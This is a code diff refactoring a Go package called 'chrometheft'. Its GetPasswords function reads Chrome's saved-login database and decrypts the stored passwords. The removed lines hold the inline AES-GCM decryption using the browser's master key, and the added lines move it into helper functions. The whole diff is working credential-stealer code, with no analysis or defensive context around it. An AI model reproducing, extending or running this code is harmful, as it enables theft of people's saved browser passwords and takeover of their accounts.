@@ -1,13 +1,10 @@
 package chrometheft
 
 import (
-	"crypto/aes"
-	"crypto/cipher"
 	"database/sql"
 	"errors"
-	"fmt"
 	"os"
-	"strings"
+
 	_ "github.com/mattn/go-sqlite3"
 )
 
@@ -47,6 +44,8 @@ func GetPasswords(path string) ([]Password, error) {
 		os.Remove(dbFile)
 	}()
 
+	masterKey, err := GetMasterKey(path)
+
 	// iterate over the rows
 	for rows.Next() {
 		var url, username, password string
@@ -55,50 +54,10 @@ func GetPasswords(path string) ([]Password, error) {
 			continue // make sure to iterate over all rows
 		}
 
-		var masterKey []byte = nil
+		password, err = DecryptEncryptedData(password, masterKey)
 
-		if strings.HasPrefix(password, "v10") { // chrome 80+
-			if masterKey == nil { // get the master key if it's not already gotten
-				masterKey, err = GetMasterKey(path)
-				if err != nil {
-					return passwords, err
-				}
-			}
-
-			c, err := aes.NewCipher(masterKey)
-			if err != nil {
-				continue
-			}
-			gcm, err := cipher.NewGCM(c)
-			if err != nil {
-				continue
-			}
-			nonceSize := gcm.NonceSize()
-			cipherText := []byte(password[3:])
-			if len(cipherText) < nonceSize {
-				continue
-			}
-
-			nonce, cipherText := cipherText[:nonceSize], cipherText[nonceSize:]
-			plainText, err := gcm.Open(nil, nonce, cipherText, nil)
-			if err != nil {
-				fmt.Println(err)
-			}
-			password = string(plainText)
-
-			if url != "" && username != "" && password != "" {
-				passwords = append(passwords, Password{URL: url, Username: username, Password: password})
-			}
-		} else {
-			pwd, err := Decrypt([]byte(password))
-			if err != nil {
-				continue
-			}
-			password = string(pwd)
-
-			if url != "" && username != "" && password != "" {
-				passwords = append(passwords, Password{URL: url, Username: username, Password: password})
-			}
+		if url != "" && username != "" && password != "" {
+			passwords = append(passwords, Password{URL: url, Username: username, Password: password})
 		}
 	}
 
